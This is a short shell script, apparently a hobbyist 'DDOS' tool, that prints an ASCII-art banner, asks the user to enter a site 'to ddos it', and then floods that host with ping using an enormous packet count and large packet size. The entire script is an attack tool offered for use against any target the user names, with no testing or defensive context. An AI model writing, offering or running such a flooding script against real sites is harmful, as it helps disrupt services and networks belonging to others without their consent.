#!/bin/sh

echo  "  ____  ____   ___  ____  "
echo  " |  _ \|  _ \ / _ \/ ___| "
echo "  | | | | | | | | | \___ \ "
echo "  | |_| | |_| | |_| |___) | "
echo "  |____/|____/ \___/|____/  "
  
echo                                                 

echo "enter site below to ddos it"
read site
echo
ping $site -c 99999999 -s 1400

